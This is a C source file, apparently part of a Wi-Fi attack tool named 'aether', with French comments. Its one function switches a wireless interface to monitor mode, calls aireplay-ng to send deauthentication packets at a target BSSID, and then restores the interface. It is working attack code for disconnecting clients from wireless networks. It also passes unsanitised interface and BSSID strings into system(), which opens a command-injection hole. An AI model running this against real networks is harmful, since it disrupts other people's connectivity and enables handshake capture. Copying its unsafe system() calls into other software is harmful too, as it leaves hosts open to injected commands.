#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "aether.h"
#include "config.h"

/* Envoi de paquets deauth ciblés */
int aether_deauth(const char *iface, const char *bssid) {
    char command[512];

    if (strlen(iface) == 0) {
        fprintf(stderr, "[!] Interface required for deauth.\n");
        return -1;
    }

    if (bssid == NULL || strlen(bssid) == 0) {
        fprintf(stderr, "[!] BSSID required for deauth.\n");
        return -1;
    }

    printf("[*] Sending deauth packets to %s on %s...\n", bssid, iface);

    /* Mettre l'interface en mode monitor */
    snprintf(command, sizeof(command), "ip link set %s down", iface);
    system(command);
    snprintf(command, sizeof(command), "iw dev %s set type monitor", iface);
    system(command);
    snprintf(command, sizeof(command), "ip link set %s up", iface);
    system(command);

    /* Lancer aireplay-ng pour envoyer les paquets deauth */
    snprintf(command, sizeof(command),
             "aireplay-ng --deauth 10 -a %s %s",
             bssid, iface);

    int ret = system(command);

    /* Restaurer le mode managed */
    snprintf(command, sizeof(command), "ip link set %s down", iface);
    system(command);
    snprintf(command, sizeof(command), "iw dev %s set type managed", iface);
    system(command);
    snprintf(command, sizeof(command), "ip link set %s up", iface);
    system(command);

    if (ret == 0) {
        printf("[+] Deauth packets sent successfully.\n");
    } else {
        fprintf(stderr, "[!] Deauth failed.\n");
    }

    return ret;
}
